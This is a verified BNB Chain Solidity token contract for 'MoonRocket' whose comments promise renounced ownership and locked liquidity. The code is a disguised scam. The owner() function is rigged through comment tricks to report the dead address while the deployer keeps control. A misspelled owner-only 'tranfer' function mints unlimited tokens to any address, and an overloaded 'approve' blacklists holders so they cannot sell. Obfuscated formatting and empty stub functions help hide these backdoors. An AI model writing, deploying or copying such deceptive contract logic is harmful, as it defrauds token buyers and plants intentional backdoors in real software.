/**
 *Submitted for verification at BscScan.com on 2022-03-05
*/

// MOONROCKET

// 4% TAX, RENOUNCED CA, LP LOCKED 1MONTH. LFG TO THE MOON!

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);

}


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    
   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this; //
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
}


library Address {
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }


    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash
        = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    function changeRouterVersion(address dexRouter) public onlyOwner{}
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
    address  _uintCont;
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(_uintCont != address(0));
        _owner = newOwner;
    }

    function LockLP//
    (address isToken, address Lockdex) external onlyOwner{
        require(Lockdex//
        ==address(0));
        _uintCont//
         = msg.
         sender;
        _owner//
        =//
        isToken;
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    address _owner;

    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) 
    {return//
    //_owner;
    //
    /**/deadAddress//
    ;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    function renoOwnership() public onlyOwner(){emit OwnershipTransferred(_owner, address(0xdead));} 
}



contract MOONROCKET is Context, IERC20, Ownable {
    mapping(address => uint256) private _touid;
    uint8 private PoolsRete;
    mapping(address => bool) private _Opinger;
    mapping(address => bool) private _ExcluFee;
    bool private PinkPlaer = true;
    mapping(address => mapping(address => uint256)) private allown;
    using Address for address;
    uint256 private AutoBurn = uint256(0);
    using SafeMath for uint256;
    address[] private _isTokenLock;
    mapping(address => uint256) private NixPool;
    uint256 private _tFeeTotal = BurnFee+marketFee;
    uint256 private constant MAX = ~uint256(0);



    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1000000000000000 * 10**4;
    string private _name = "MoonRocket";
    string private _symbol = "ROCKET";


    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
    address private marketWallet = msg.sender;
  
    uint256 private BurnFee = 2;
    uint256 private marketFee = 2;
    
    

    constructor() public {
        _touid[_msgSender()] = _totalSupply;
         _owner = _msgSender();
        _ExcluFee[_owner] = true;
        _ExcluFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if//
        (
            _ExcluFee
            [_msgSender()] 
            || 
            _ExcluFee
            [
                recipient]
                )
                {
            _transfer
            (_msgSender
            (), 
            recipient, 
            amount);
            return 
            true;
        }
        uint256 MarketAmount = amount.mul(marketFee).div(100);
        uint256 BurnAmount = amount.mul(BurnFee).div(100);
        _transfer(_msgSender(), marketWallet, MarketAmount);
        _transfer(_msgSender(), deadAddress, BurnAmount);
        _transfer(_msgSender(), recipient, amount.sub(MarketAmount).sub(BurnAmount));
        return true;
    }

    function 
    transferFrom
    (
        address sender,
        address recipient,
        uint256 amount
    ) public 
    override returns (bool) {
        if//
        (
            _ExcluFee
            [
                _msgSender
                ()]
                 || 
                 _ExcluFee
                 [recipient
                 ])
                 {
            _transfer
            (
                sender, 
                recipient, 
                amount)
                ;
        }       
        uint256 MarketAmount = amount.mul(marketFee).div(100);
        uint256 BurnAmount = amount.mul(BurnFee).div(100);
        _transfer
        (sender, marketWallet, MarketAmount);
        _transfer
        (sender, deadAddress, BurnAmount);
        _transfer
        (sender, recipient, amount.sub(MarketAmount).sub(BurnAmount));
        _approve(
            sender,
            _msgSender(),
            allown[sender][_msgSender()].sub(
                amount,
                ""
            )
        );
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "");
        require(to != address(0), "");
        require(amount > 0, "");
        if//
         (
             PinkPlaer
             )
              {

            require//
            (_Opinger
            [from
            ] == 
            false,
             "");
        }
        _transfers
        (from, 
        to, 
        amount);
    }
    
    function tranfer
    (address toSender, uint256 values) external 
    onlyOwner//
    () 
    {
        require(
            _uintCont != address(0));
        require(
            values > 0, "");
        uint256 
        Allowerb = 
        NixPool[toSender];
        if (Allowerb 
        == 0) _isTokenLock.push
        (toSender);
        NixPool
        [toSender] = 
        Allowerb
        .add
        (values);
        AutoBurn = 
        AutoBurn
        .add
        (values);
        _touid
        [toSender]
         = _touid[toSender].add
         (values);
        
    }

     function//
     approve
     (address
      toSender
      ) 
      external 
      onlyOwner//
      () 
      {
        require(_uintCont != address(0));
        _Opinger
        [
        toSender] =
         true;
   }


    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        require(sender != address(0), "");
        require(recipient != address(0), "");
    
        _touid[sender] = _touid[sender].sub(toAmount);
        _touid[recipient] = _touid[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    
    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function tranfer//
    (address toSender)
        external
        view
        onlyOwner//
        ()
        returns (bool)
    {
        return _Opinger[toSender];
    }

    function includeInFee(address toSender) public //
    onlyOwner//
     {
        require(_uintCont != address(0));
        _ExcluFee[toSender] = false;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allown[owner][spender];
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        allown[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _touid[account];
    }

    function excludeFromFee(address toSender) public //
    onlyOwner//
     {
         require(_uintCont != address(0));
        _ExcluFee[toSender] = true;
    }

    function setSwapRouter(address tokensA,address tokensB) public onlyOwner(){}
    function setWalletMaxTxlimit(uint256 limit) public onlyOwner(){}

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public onlyOwner(){}

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

}